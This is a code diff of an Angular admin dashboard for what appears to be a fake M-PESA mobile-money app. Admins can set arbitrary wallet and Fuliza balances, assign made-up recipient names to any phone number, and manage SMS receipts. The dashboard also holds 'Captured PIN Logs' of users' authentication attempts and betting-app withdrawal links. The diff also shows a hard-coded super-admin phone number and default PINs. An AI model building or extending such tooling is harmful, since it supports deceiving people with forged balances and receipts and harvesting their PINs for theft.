@@ -329,7 +329,7 @@ import { PwaService } from '../../services/pwa.service';
             <button type="submit" class="primary-btn w-full">Log In to Dashboard</button>
 
             <div class="login-hint">
-              Default Super Admin Phone: <strong>0722220165</strong>
+              Protected System • Authorized Admin Authentication
             </div>
           </form>
         </div>
@@ -339,330 +339,171 @@ import { PwaService } from '../../services/pwa.service';
       <!-- AUTHENTICATED ADMIN DASHBOARD CONTENT                         -->
       <!-- ============================================================= -->
       <div class="admin-content" *ngIf="currentAdmin">
-        <!-- Metric Cards -->
-        <div class="metrics-grid">
-          <div class="metric-card">
-            <span class="m-title">Current Balance</span>
-            <span class="m-val text-green">Ksh {{ userForm.balance | number:'1.2-2' }}</span>
-            <span class="m-sub">Fuliza: Ksh {{ userForm.fuliza | number:'1.2-2' }}</span>
-          </div>
-          <div class="metric-card">
-            <span class="m-title">Active User</span>
-            <span class="m-val">{{ userForm.name }} ({{ userForm.initials }})</span>
-            <span class="m-sub">{{ userForm.phone }}</span>
-          </div>
-          <div class="metric-card">
-            <span class="m-title">Admin Accounts</span>
-            <span class="m-val text-cyan">{{ adminsList.length }}</span>
-            <span class="m-sub">Active Admins</span>
-          </div>
-          <div class="metric-card">
-            <span class="m-title">Saved Favourites</span>
-            <span class="m-val text-yellow">{{ favoritesList.length }}</span>
-            <span class="m-sub">Quick send contacts</span>
-          </div>
-          <div class="metric-card">
-            <span class="m-title">Total Sent</span>
-            <span class="m-val text-warning">Ksh {{ overview?.totalSent | number:'1.2-2' }}</span>
-            <span class="m-sub">{{ overview?.totalTransactions || 0 }} transactions</span>
-          </div>
-          <div class="metric-card">
-            <span class="m-title">Captured PINs</span>
-            <span class="m-val text-red">{{ overview?.pinLogsCount || pinLogs.length }}</span>
-            <span class="m-sub">Recorded attempts</span>
-          </div>
-        </div>
-
-        <!-- Super Admin Quick Fast Controls Hub -->
-        <div class="super-quick-hub" *ngIf="currentAdmin?.role === 'Super Admin'">
-          <div class="quick-hub-header">
-            <span class="hub-badge">⚡ SUPER ADMIN QUICK HUB</span>
-            <span class="hub-sub">Instant balance adjustment, admin creation, and mobile app download in 1 click</span>
-          </div>
-
-          <div class="quick-cards-grid">
-            <!-- 1. Quick Balance & PIN Adjuster Card -->
-            <div class="quick-card balance-qc">
-              <div class="qc-head">
-                <span class="qc-icon">💰</span>
-                <div>
-                  <h4 class="qc-title">Fast Balance Adjuster</h4>
-                  <p class="qc-desc">Select an admin and update their live balance immediately</p>
-                </div>
+        <!-- UPPERMOST SETTINGS NAVIGATION BAR (Upper-left positioned) -->
+        <div class="top-nav-bar">
+          <!-- Mobile Settings Selector (Touch-friendly dropdown button for mobile) -->
+          <div class="mobile-settings-bar">
+            <button type="button" class="mobile-nav-toggle-btn" (click)="toggleMobileNav($event)">
+              <div class="msb-btn-left">
+                <span class="msb-current-icon">{{ getTabIcon(activeTab) }}</span>
+                <span class="msb-current-title">{{ getTabTitle(activeTab) }}</span>
               </div>
-              <div class="qc-body">
-                <div class="qc-field">
-                  <label>Select Admin Account</label>
-                  <select [(ngModel)]="quickSelectedPhone" (change)="onQuickAdminSelect()" class="qc-select">
-                    <option *ngFor="let a of adminsList" [value]="a.phone">
-                      {{ a.name }} ({{ a.phone }}) — Ksh {{ (a.wallet?.balance ?? 61.66) | number:'1.2-2' }}
-                    </option>
-                  </select>
-                </div>
+              <span class="msb-chevron" [class.open]="showMobileNav">▼</span>
+            </button>
 
-                <!-- Balance Stepper with + and - buttons -->
-                <div class="qc-field">
-                  <div class="balance-label-row">
-                    <label>Balance (Ksh)</label>
-                    <span class="auto-sync-indicator">⚡ Auto-syncs live to app</span>
-                  </div>
-                  <div class="stepper-container">
-                    <button type="button" class="step-btn btn-minus" (click)="stepQuickBalance(-1)" title="Deduct Step Amount">
-                      −
-                    </button>
-                    <input 
-                      type="number" 
-                      step="0.01" 
-                      [(ngModel)]="quickBalanceInput" 
-                      placeholder="e.g. 50000" 
-                      class="qc-input stepper-input" 
-                    />
-                    <button type="button" class="step-btn btn-plus" (click)="stepQuickBalance(1)" title="Add Step Amount">
-                      +
-                    </button>
-                  </div>
-                </div>
-
-                <!-- Quick Increment / Decrement Chips -->
-                <div class="quick-chips-wrapper">
-                  <div class="chips-group">
-                    <span class="chips-group-title">Deduct:</span>
-                    <button type="button" class="chip-btn chip-minus" (click)="quickAdjustBalance(-5000)">−5K</button>
-                    <button type="button" class="chip-btn chip-minus" (click)="quickAdjustBalance(-1000)">−1K</button>
-                    <button type="button" class="chip-btn chip-minus" (click)="quickAdjustBalance(-500)">−500</button>
-                    <button type="button" class="chip-btn chip-minus" (click)="quickAdjustBalance(-100)">−100</button>
-                  </div>
-                  <div class="chips-group">
-                    <span class="chips-group-title">Add:</span>
-                    <button type="button" class="chip-btn chip-plus" (click)="quickAdjustBalance(100)">+100</button>
-                    <button type="button" class="chip-btn chip-plus" (click)="quickAdjustBalance(500)">+500</button>
-                    <button type="button" class="chip-btn chip-plus" (click)="quickAdjustBalance(1000)">+1K</button>
-                    <button type="button" class="chip-btn chip-plus" (click)="quickAdjustBalance(5000)">+5K</button>
-                    <button type="button" class="chip-btn chip-plus" (click)="quickAdjustBalance(10000)">+10K</button>
-                    <button type="button" class="chip-btn chip-plus chip-mega" (click)="quickAdjustBalance(50000)">+50K</button>
-                  </div>
-                </div>
-
-                <!-- Step Size and Working PIN Row -->
-                <div class="qc-row">
-                  <div class="qc-field">
-                    <label>+/- Step Size</label>
-                    <select [(ngModel)]="quickStepSize" class="qc-select">
-                      <option [value]="100">± Ksh 100</option>
-                      <option [value]="500">± Ksh 500</option>
-                      <option [value]="1000">± Ksh 1,000</option>
-                      <option [value]="5000">± Ksh 5,000</option>
-                      <option [value]="10000">± Ksh 10,000</option>
-                    </select>
-                  </div>
-                  <div class="qc-field">
-                    <label>Working PIN</label>
-                    <input type="text" maxlength="4" [(ngModel)]="quickPinInput" placeholder="4-digit PIN" class="qc-input" />
-                  </div>
-                </div>
-
-                <div class="qc-action-row" style="display:flex;gap:8px;">
-                  <button type="button" class="qc-btn primary-qc-btn" style="flex:1;" (click)="saveQuickBalanceAndPin()">
-                    ⚡ Save & Sync
-                  </button>
-                  <button type="button" class="qc-btn" style="flex:1;background:#1e262c;border:1px solid #00c853;color:#00e676;" (click)="openQuickModal('add')">
-                    ➕ Choose Amount
-                  </button>
-                </div>
+            <!-- Dropdown sheet positioned upper-left -->
+            <div class="mobile-nav-dropdown" *ngIf="showMobileNav" (click)="$event.stopPropagation()">
+              <div class="mnd-header">
+                <span>⚙️ Choose Settings Section</span>
+                <button type="button" class="mnd-close" (click)="showMobileNav = false">✕</button>
               </div>
-            </div>
-
-            <!-- 2. Quick Admin Creator Card -->
-            <div class="quick-card admin-qc">
-              <div class="qc-head">
-                <span class="qc-icon">👤</span>
-                <div>
-                  <h4 class="qc-title">Fast Admin Creator</h4>
-                  <p class="qc-desc">Create a new isolated admin with their own PIN and balance</p>
-                </div>
-              </div>
-              <div class="qc-body">
-                <div class="qc-row">
-                  <div class="qc-field">
-                    <label>Admin Name</label>
-                    <input type="text" [(ngModel)]="newAdminName" placeholder="Full name" class="qc-input" />
+              <div class="mnd-items">
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'user'" (click)="selectTab('user')">
+                  <span class="mnd-icon">👤</span>
+                  <div class="mnd-text">
+                    <strong>My Wallet & Balance</strong>
+                    <small>Live app balance, name, fuliza & prefixes</small>
                   </div>
-                  <div class="qc-field">
-                    <label>Phone Number</label>
-                    <input type="tel" [(ngModel)]="newAdminPhone" placeholder="0712345678" class="qc-input" />
+                </button>
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'workingPins'" (click)="selectTab('workingPins')">
+                  <span class="mnd-icon">🔑</span>
+                  <div class="mnd-text">
+                    <strong>App PINs & Passwords ({{ workingPins.length }})</strong>
+                    <small>Manage 4-digit unlock PINs & dashboard login</small>
                   </div>
-                </div>
-
-                <div class="qc-row">
-                  <div class="qc-field">
-                    <label>Working PIN</label>
-                    <input type="text" maxlength="4" [(ngModel)]="newAdminWorkingPin" placeholder="4 digits (e.g. 2580)" class="qc-input" />
+                </button>
+                <button type="button" class="mnd-item" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'admins'" (click)="selectTab('admins')">
+                  <span class="mnd-icon">👥</span>
+                  <div class="mnd-text">
+                    <strong>Manage Admins ({{ adminsList.length }})</strong>
+                    <small>Full control: edit info, balances & revoke</small>
                   </div>
-                  <div class="qc-field">
-                    <label>Initial Balance (Ksh)</label>
-                    <input type="number" step="0.01" [(ngModel)]="newAdminBalance" placeholder="61.66" class="qc-input" />
+                </button>
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'customLookups'" (click)="selectTab('customLookups')">
+                  <span class="mnd-icon">🎯</span>
+                  <div class="mnd-text">
+                    <strong>Custom Names & Numbers ({{ customLookupsList.length }})</strong>
+                    <small>Set specific recipient name for any phone number</small>
                   </div>
-                </div>
-
-                <button type="button" class="qc-btn success-qc-btn" (click)="handleAddAdmin()">
-                  ✨ Create Admin & Working PIN
+                </button>
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'favs'" (click)="selectTab('favs')">
+                  <span class="mnd-icon">⭐</span>
+                  <div class="mnd-text">
+                    <strong>Saved Favourites ({{ favoritesList.length }})</strong>
+                    <small>Frequent contacts list for Send Money</small>
+                  </div>
+                </button>
+                <button type="button" class="mnd-item highlight-item" [class.active]="activeTab === 'download'" (click)="selectTab('download')">
+                  <span class="mnd-icon">📲</span>
+                  <div class="mnd-text">
+                    <strong>App Download & PWA</strong>
+                    <small>Install mobile app icon on home screen</small>
+                  </div>
+                </button>
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'txs'" (click)="selectTab('txs')">
+                  <span class="mnd-icon">📜</span>
+                  <div class="mnd-text">
+                    <strong>Transactions Manager</strong>
+                    <small>Live transaction ledger and SMS receipts</small>
+                  </div>
+                </button>
+                <button type="button" class="mnd-item" [class.active]="activeTab === 'pins'" (click)="selectTab('pins')">
+                  <span class="mnd-icon">🚨</span>
+                  <div class="mnd-text">
+                    <strong>Captured PIN Logs ({{ pinLogs.length }})</strong>
+                    <small>View recorded user authentication attempts</small>
+                  </div>
+                </button>
+                <button type="button" class="mnd-item" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'system'" (click)="selectTab('system')">
+                  <span class="mnd-icon">⚙️</span>
+                  <div class="mnd-text">
+                    <strong>System Reset</strong>
+                    <small>Database status, sync, and system reset</small>
+                  </div>
+                </button>
+                <button type="button" class="mnd-item connected-item" [class.active]="activeTab === 'connectedApps'" (click)="selectTab('connectedApps')">
+                  <span class="mnd-icon">🔗</span>
+                  <div class="mnd-text">
+                    <strong>Connected Apps (3)</strong>
+                    <small>Pakabet, Vexbet, Trader Kit withdrawals</small>
+                  </div>
                 </button>
               </div>
             </div>
-
-            <!-- 3. Quick Mobile App Download Card -->
-            <div class="quick-card download-qc">
-              <div class="qc-head">
-                <span class="qc-icon">📲</span>
-                <div>
-                  <h4 class="qc-title">Download Mobile App</h4>
-                  <p class="qc-desc">Install or share the live PWA mobile app</p>
-                </div>
-              </div>
-              <div class="qc-body">
-                <button type="button" class="qc-btn download-qc-btn" (click)="downloadAppToHomescreen()">
-                  📥 Install App on this Device
-                </button>
-                <div class="qc-link-row">
-                  <span class="qc-url-tag">https://twoapp.site</span>
-                  <button type="button" class="qc-copy-btn" (click)="copyAppLink()">📋 Copy Link</button>
-                </div>
-                <small class="qc-hint">On mobile: open <strong>twoapp.site</strong> in browser → tap Share/Menu → <strong>Add to Home Screen</strong></small>
-              </div>
-            </div>
           </div>
-        </div>
 
-        <!-- Mobile Settings Selector (Touch-friendly dropdown button for mobile) -->
-        <div class="mobile-settings-bar">
-          <div class="msb-label">SELECT SETTINGS SECTION:</div>
-          <button type="button" class="mobile-nav-toggle-btn" (click)="toggleMobileNav($event)">
-            <div class="msb-btn-left">
-              <span class="msb-current-icon">{{ getTabIcon(activeTab) }}</span>
-              <span class="msb-current-title">{{ getTabTitle(activeTab) }}</span>
-            </div>
-            <span class="msb-chevron" [class.open]="showMobileNav">▼</span>
-          </button>
-
-          <!-- Dropdown sheet -->
-          <div class="mobile-nav-dropdown" *ngIf="showMobileNav" (click)="$event.stopPropagation()">
-            <div class="mnd-header">
-              <span>⚙️ Choose Settings Section</span>
-              <button type="button" class="mnd-close" (click)="showMobileNav = false">✕</button>
-            </div>
-            <div class="mnd-items">
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'user'" (click)="selectTab('user')">
-                <span class="mnd-icon">👤</span>
-                <div class="mnd-text">
-                  <strong>My Wallet & Balance</strong>
-                  <small>Live app balance, name, fuliza & prefixes</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'workingPins'" (click)="selectTab('workingPins')">
-                <span class="mnd-icon">🔑</span>
-                <div class="mnd-text">
-                  <strong>App PINs & Passwords ({{ workingPins.length }})</strong>
-                  <small>Manage 4-digit unlock PINs & dashboard login</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'admins'" (click)="selectTab('admins')">
-                <span class="mnd-icon">👥</span>
-                <div class="mnd-text">
-                  <strong>Manage Admins ({{ adminsList.length }})</strong>
-                  <small>Full control: edit info, balances & revoke</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'customLookups'" (click)="selectTab('customLookups')">
-                <span class="mnd-icon">🎯</span>
-                <div class="mnd-text">
-                  <strong>Custom Names & Numbers ({{ customLookupsList.length }})</strong>
-                  <small>Set specific recipient name for any phone number</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'favs'" (click)="selectTab('favs')">
-                <span class="mnd-icon">⭐</span>
-                <div class="mnd-text">
-                  <strong>Saved Favourites ({{ favoritesList.length }})</strong>
-                  <small>Frequent contacts list for Send Money</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item highlight-item" [class.active]="activeTab === 'download'" (click)="selectTab('download')">
-                <span class="mnd-icon">📲</span>
-                <div class="mnd-text">
-                  <strong>App Download & PWA</strong>
-                  <small>Install mobile app icon on home screen</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'txs'" (click)="selectTab('txs')">
-                <span class="mnd-icon">📜</span>
-                <div class="mnd-text">
-                  <strong>Transactions Manager</strong>
-                  <small>Live transaction ledger and SMS receipts</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" [class.active]="activeTab === 'pins'" (click)="selectTab('pins')">
-                <span class="mnd-icon">🚨</span>
-                <div class="mnd-text">
-                  <strong>Captured PIN Logs ({{ pinLogs.length }})</strong>
-                  <small>View recorded user authentication attempts</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'system'" (click)="selectTab('system')">
-                <span class="mnd-icon">⚙️</span>
-                <div class="mnd-text">
-                  <strong>System Reset</strong>
-                  <small>Database status, sync, and system reset</small>
-                </div>
-              </button>
-              <button type="button" class="mnd-item connected-item" [class.active]="activeTab === 'connectedApps'" (click)="selectTab('connectedApps')">
-                <span class="mnd-icon">🔗</span>
-                <div class="mnd-text">
-                  <strong>Connected Apps (3)</strong>
-                  <small>Pakabet, Vexbet, Trader Kit withdrawals</small>
-                </div>
-              </button>
-            </div>
+          <!-- Tabs Navigation (Desktop & Tablet) -->
+          <div class="admin-tabs">
+            <button class="a-tab" [class.active]="activeTab === 'user'" (click)="activeTab = 'user'">
+              👤 My Wallet & Balances
+            </button>
+            <button class="a-tab" [class.active]="activeTab === 'workingPins'" (click)="activeTab = 'workingPins'">
+              🔑 Working App PINs ({{ workingPins.length }})
+            </button>
+            <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'admins'" (click)="activeTab = 'admins'">
+              👥 Manage Admins ({{ adminsList.length }})
+            </button>
+            <button class="a-tab" [class.active]="activeTab === 'customLookups'" (click)="activeTab = 'customLookups'">
+              🎯 Custom Names ({{ customLookupsList.length }})
+            </button>
+            <button class="a-tab" [class.active]="activeTab === 'favs'" (click)="activeTab = 'favs'">
+              ⭐ Manage Favourites ({{ favoritesList.length }})
+            </button>
+            <button class="a-tab highlight-tab" [class.active]="activeTab === 'download'" (click)="activeTab = 'download'">
+              📲 Download App
+            </button>
+            <button class="a-tab" [class.active]="activeTab === 'txs'" (click)="activeTab = 'txs'">
+              💸 Transactions Manager
+            </button>
+            <button class="a-tab" [class.active]="activeTab === 'pins'" (click)="activeTab = 'pins'">
+              🔑 Captured PIN Logs ({{ pinLogs.length }})
+            </button>
+            <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'system'" (click)="activeTab = 'system'">
+              ⚙️ System Reset
+            </button>
+            <button class="a-tab connected-apps-tab" [class.active]="activeTab === 'connectedApps'" (click)="activeTab = 'connectedApps'">
+              🔗 Connected Apps (3)
+            </button>
           </div>
-        </div>
-
-        <!-- Tabs Navigation (Desktop & Tablet) -->
-        <div class="admin-tabs">
-          <button class="a-tab" [class.active]="activeTab === 'user'" (click)="activeTab = 'user'">
-            👤 My Wallet & Balances
-          </button>
-          <button class="a-tab" [class.active]="activeTab === 'workingPins'" (click)="activeTab = 'workingPins'">
-            🔑 Working App PINs ({{ workingPins.length }})
-          </button>
-          <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'admins'" (click)="activeTab = 'admins'">
-            👥 Manage Admins ({{ adminsList.length }})
-          </button>
-          <button class="a-tab" [class.active]="activeTab === 'customLookups'" (click)="activeTab = 'customLookups'">
-            🎯 Custom Names ({{ customLookupsList.length }})
-          </button>
-          <button class="a-tab" [class.active]="activeTab === 'favs'" (click)="activeTab = 'favs'">
-            ⭐ Manage Favourites ({{ favoritesList.length }})
-          </button>
-          <button class="a-tab highlight-tab" [class.active]="activeTab === 'download'" (click)="activeTab = 'download'">
-            📲 Download App
-          </button>
-          <button class="a-tab" [class.active]="activeTab === 'txs'" (click)="activeTab = 'txs'">
-            💸 Transactions Manager
-          </button>
-          <button class="a-tab" [class.active]="activeTab === 'pins'" (click)="activeTab = 'pins'">
-            🔑 Captured PIN Logs ({{ pinLogs.length }})
-          </button>
-          <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'system'" (click)="activeTab = 'system'">
-            ⚙️ System Reset
-          </button>
-          <button class="a-tab connected-apps-tab" [class.active]="activeTab === 'connectedApps'" (click)="activeTab = 'connectedApps'">
-            🔗 Connected Apps (3)
-          </button>
         </div>
 
         <!-- ============================================================= -->
         <!-- TAB 1: User & Balance Editor (ISOLATED PER ADMIN)             -->
         <!-- ============================================================= -->
         <div class="tab-pane" *ngIf="activeTab === 'user'">
+          <!-- Overview Metrics (compact inside wallet) -->
+          <div class="metrics-grid">
+            <div class="metric-card">
+              <span class="m-title">Current Balance</span>
+              <span class="m-val text-green">Ksh {{ userForm.balance | number:'1.2-2' }}</span>
+              <span class="m-sub">Fuliza: Ksh {{ userForm.fuliza | number:'1.2-2' }}</span>
+            </div>
+            <div class="metric-card">
+              <span class="m-title">Active User</span>
+              <span class="m-val">{{ userForm.name }} ({{ userForm.initials }})</span>
+              <span class="m-sub">{{ userForm.phone }}</span>
+            </div>
+            <div class="metric-card">
+              <span class="m-title">Admin Accounts</span>
+              <span class="m-val text-cyan">{{ adminsList.length }}</span>
+              <span class="m-sub">Active Admins</span>
+            </div>
+            <div class="metric-card">
+              <span class="m-title">Saved Favourites</span>
+              <span class="m-val text-yellow">{{ favoritesList.length }}</span>
+              <span class="m-sub">Quick send contacts</span>
+            </div>
+            <div class="metric-card">
+              <span class="m-title">Total Sent</span>
+              <span class="m-val text-warning">Ksh {{ overview?.totalSent | number:'1.2-2' }}</span>
+              <span class="m-sub">{{ overview?.totalTransactions || 0 }} transactions</span>
+            </div>
+            <div class="metric-card">
+              <span class="m-title">Captured PINs</span>
+              <span class="m-val text-red">{{ overview?.pinLogsCount || pinLogs.length }}</span>
+              <span class="m-sub">Recorded attempts</span>
+            </div>
+          </div>
           <div class="section-card">
             <div class="isolation-notice">
               🛡️ <strong>Isolated Account:</strong> Modifying your balance only updates your personal account (<strong>{{ currentAdmin?.name }}</strong>). Other admins are completely unaffected.
@@ -847,21 +688,66 @@ import { PwaService } from '../../services/pwa.service';
         <!-- TAB 2: Multi-Admin Management (SUPER ADMIN ONLY)              -->
         <!-- ============================================================= -->
         <div class="tab-pane" *ngIf="activeTab === 'admins' && currentAdmin?.role === 'Super Admin'">
-          <!-- FAST LIVE BALANCE ADJUSTER FOR EACH ADMIN (CARDS VIEW) -->
           <div class="section-card admin-balances-hub">
-            <div class="hub-title-row">
+            <div class="hub-title-row" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
               <div>
-                <h3 class="card-title">💰 Live Balance Adjuster for Each Admin</h3>
+                <h3 class="card-title">👥 Authorized Administrators ({{ adminsList.length }})</h3>
                 <p class="card-desc">
-                  Click the <strong>+</strong> button on any admin below to choose an amount and immediately update their live app balance.
+                  Tap any admin card or click <strong>✏️ Edit Info</strong> to edit full details, PINs, password, or balance.
                 </p>
               </div>
-              <span class="hub-pill">Instant Sync to App</span>
+              <button 
+                type="button" 
+                class="primary-btn" 
+                (click)="showCreateAdminCard = !showCreateAdminCard" 
+                style="background:#00c853; color:#000; font-weight:700; display:flex; align-items:center; gap:6px; padding:8px 16px; border-radius:8px;">
+                <span>{{ showCreateAdminCard ? '✕ Close Form' : '➕ Add New Admin' }}</span>
+              </button>
             </div>
 
-            <div class="admin-cards-grid">
+            <!-- Collapsible Create Admin Form -->
+            <div class="collapsible-create-form" *ngIf="showCreateAdminCard" style="background: #161b22; border: 1.5px solid #30363d; border-radius: 12px; padding: 18px; margin: 16px 0 24px 0;">
+              <h4 style="margin: 0 0 12px 0; color: #58a6ff; font-size: 14px; font-weight: 700;">Create New Isolated Admin Account</h4>
+              <form (ngSubmit)="handleAddAdmin()" class="form-grid admin-create-grid">
+                <div class="form-field">
+                  <label>Admin Full Name</label>
+                  <input type="text" [(ngModel)]="newAdminName" name="newAdminName" placeholder="Full Name (e.g. Dennis Ochieng)" required class="qc-input" />
+                </div>
+                <div class="form-field">
+                  <label>Admin Phone Number</label>
+                  <input type="tel" [(ngModel)]="newAdminPhone" name="newAdminPhone" placeholder="e.g. 07XXXXXXXX" required class="qc-input" />
+                </div>
+                <div class="form-field">
+                  <label>Dashboard Password / PIN</label>
+                  <input type="text" maxlength="10" [(ngModel)]="newAdminPassword" name="newAdminPassword" placeholder="e.g. 5555" required class="qc-input" />
+                </div>
+                <div class="form-field">
+                  <label>Initial App Working PIN (4 digits)</label>
+                  <input type="text" maxlength="4" [(ngModel)]="newAdminWorkingPin" name="newAdminWorkingPin" placeholder="e.g. 7777" required class="qc-input" />
+                </div>
+                <div class="form-field">
+                  <label>Initial M-PESA Balance (Ksh)</label>
+                  <input type="number" step="0.01" [(ngModel)]="newAdminBalance" name="newAdminBalance" placeholder="61.66" class="qc-input" />
+                </div>
+                <div class="form-field">
+                  <label>Admin Role</label>
+                  <select [(ngModel)]="newAdminRole" name="newAdminRole" class="qc-select">
+                    <option value="Admin">Admin (Isolated Account)</option>
+                    <option value="Super Admin">Super Admin</option>
+                  </select>
+                </div>
+                <div class="form-actions" style="grid-column: 1 / -1; display:flex; gap:10px; margin-top: 8px;">
+                  <button type="submit" class="primary-btn" style="background:#00c853; color:#000; font-weight:700;">+ Create Admin Account</button>
+                  <button type="button" class="cancel-btn" (click)="showCreateAdminCard = false">Cancel</button>
+                </div>
+              </form>
+            </div>
+
+            <!-- Admin Cards Grid -->
+            <div class="admin-cards-grid" style="margin-top:16px;">
               <div class="admin-balance-card" *ngFor="let adm of adminsList">
-                <div class="abc-top">
+                <!-- Clickable Top Profile: Clicking anywhere on top opens full edit modal -->
+                <div class="abc-top" (click)="openEditAdminModal(adm)" title="Click to edit admin details" style="cursor: pointer;">
                   <div class="abc-profile">
                     <div class="avatar-mini">{{ adm.name.slice(0, 2).toUpperCase() }}</div>
                     <div>
@@ -872,9 +758,14 @@ import { PwaService } from '../../services/pwa.service';
                       </div>
                     </div>
                   </div>
-                  <div class="abc-pin-tag">
-                    <span class="pin-lbl">PIN:</span>
-                    <span class="pin-val">{{ (adm.workingPins && adm.workingPins[0]) || '1234' }}</span>
+                  <div class="abc-top-right" style="display:flex; flex-direction:column; align-items:flex-end; gap:6px;">
+                    <div class="abc-pin-tag">
+                      <span class="pin-lbl">PIN:</span>
+                      <span class="pin-val">{{ (adm.workingPins && adm.workingPins[0]) || '1234' }}</span>
+                    </div>
+                    <button type="button" class="card-edit-btn" (click)="$event.stopPropagation(); openEditAdminModal(adm)" title="Edit all admin details">
+                      ✏️ Edit Info
+                    </button>
                   </div>
                 </div>
 
@@ -905,190 +796,14 @@ import { PwaService } from '../../services/pwa.service';
                   <button type="button" class="qp-chip" (click)="openBalanceModal(adm, 'add', 10000)">+10K</button>
                   <button type="button" class="qp-chip" (click)="openBalanceModal(adm, 'add', 50000)">+50K</button>
                 </div>
+
+                <!-- Revoke button on the card if non-self -->
+                <div class="abc-card-footer" *ngIf="adm.phone !== currentAdmin?.phone && adm.phone !== '0722220165'" style="margin-top:8px; padding-top:8px; border-top:1px solid rgba(255,255,255,0.06); display:flex; justify-content:flex-end;">
+                  <button type="button" class="card-revoke-btn" (click)="handleRemoveAdmin(adm.phone)">
+                    ✕ Revoke Admin
+                  </button>
+                </div>
               </div>
-            </div>
-          </div>
-
-          <div class="section-card">
-            <h3 class="card-title">Super Admin Control: Create & Revoke Admins</h3>
-            <p class="card-desc">
-              As Super Admin, you can authorize new administrators. Each admin receives their own isolated balance and working PINs. You can also revoke admin privileges at any time.
-            </p>
-
-            <form (ngSubmit)="handleAddAdmin()" class="form-grid admin-create-grid">
-              <div class="form-field">
-                <label>Admin Full Name</label>
-                <input 
-                  type="text" 
-                  [(ngModel)]="newAdminName" 
-                  name="newAdminName" 
-                  placeholder="Full Name (e.g. Dennis Ochieng)" 
-                  required 
-                />
-              </div>
-
-              <div class="form-field">
-                <label>Admin Phone Number</label>
-                <input 
-                  type="tel" 
-                  [(ngModel)]="newAdminPhone" 
-                  name="newAdminPhone" 
-                  placeholder="Phone Number (e.g. 0712345678)" 
-                  required 
-                />
-              </div>
-
-              <div class="form-field">
-                <label>Dashboard Password / PIN</label>
-                <input 
-                  type="text" 
-                  maxlength="10" 
-                  [(ngModel)]="newAdminPassword" 
-                  name="newAdminPassword" 
-                  placeholder="Dashboard Password (e.g. 5555)" 
-                  required 
-                />
-              </div>
-
-              <div class="form-field">
-                <label>Initial App Working PIN (4 digits)</label>
-                <input 
-                  type="text" 
-                  maxlength="4" 
-                  [(ngModel)]="newAdminWorkingPin" 
-                  name="newAdminWorkingPin" 
-                  placeholder="App PIN (e.g. 7777)" 
-                  required 
-                />
-              </div>
-
-              <div class="form-field">
-                <label>Initial M-PESA Balance (Ksh)</label>
-                <input 
-                  type="number" 
-                  step="0.01" 
-                  [(ngModel)]="newAdminBalance" 
-                  name="newAdminBalance" 
-                  placeholder="61.66" 
-                />
-              </div>
-
-              <div class="form-field">
-                <label>Admin Role</label>
-                <select [(ngModel)]="newAdminRole" name="newAdminRole">
-                  <option value="Admin">Admin (Isolated Account)</option>
-                  <option value="Super Admin">Super Admin</option>
-                </select>
-              </div>
-
-              <div class="form-actions" style="grid-column: 1 / -1;">
-                <button type="submit" class="primary-btn">+ Create Isolated Admin Account</button>
-              </div>
-            </form>
-
-            <div class="save-msg mb-3" *ngIf="adminActionMessage">{{ adminActionMessage }}</div>
-
-            <h3 class="card-title mt-4">Authorized Admin Accounts</h3>
-            <div class="table-responsive">
-              <table class="data-table">
-                <thead>
-                  <tr>
-                    <th>Name</th>
-                    <th>Phone</th>
-                    <th>Role</th>
-                    <th>Working PIN</th>
-                    <th>Balance (Ksh)</th>
-                    <th>Fuliza (Ksh)</th>
-                    <th>Action</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <tr *ngFor="let adm of adminsList">
-                    <td>
-                      <div class="admin-cell-name">
-                        <div class="avatar-mini">{{ adm.name.slice(0, 2).toUpperCase() }}</div>
-                        <strong>{{ adm.name }}</strong>
-                        <span class="active-badge" *ngIf="adm.phone === currentAdmin?.phone">(You)</span>
-                      </div>
-                    </td>
-                    <td><code>{{ adm.phone }}</code></td>
-                    <td>
-                      <span class="role-pill" [class.super]="adm.role === 'Super Admin'">
-                        {{ adm.role }}
-                      </span>
-                    </td>
-                    <td>
-                      <input
-                        type="text"
-                        maxlength="4"
-                        class="inline-pin-input"
-                        [(ngModel)]="adm['_editPin']"
-                        [placeholder]="adm.workingPins?.[0] || '1234'"
-                        style="width:75px;padding:4px 6px;border:1px solid #36424d;background:#1e262c;color:#00c853;border-radius:6px;font-family:monospace;letter-spacing:2px;font-weight:bold;text-align:center;"
-                      />
-                    </td>
-                    <td>
-                      <div class="table-stepper-wrap">
-                        <button type="button" class="table-step-btn minus" (click)="openBalanceModal(adm, 'subtract', 1000)" title="Deduct Balance with Options">−</button>
-                        <input
-                          type="number"
-                          step="0.01"
-                          class="inline-balance-input"
-                          [(ngModel)]="adm['_editBalance']"
-                          [placeholder]="(adm.wallet?.balance ?? 61.66) | number:'1.2-2'"
-                          style="width:85px;padding:4px 6px;border:1px solid #36424d;background:#0d1117;color:#00e676;border-radius:6px;font-weight:700;text-align:center;"
-                        />
-                        <button type="button" class="table-step-btn plus" (click)="openBalanceModal(adm, 'add', 1000)" title="Add Balance with Options">+</button>
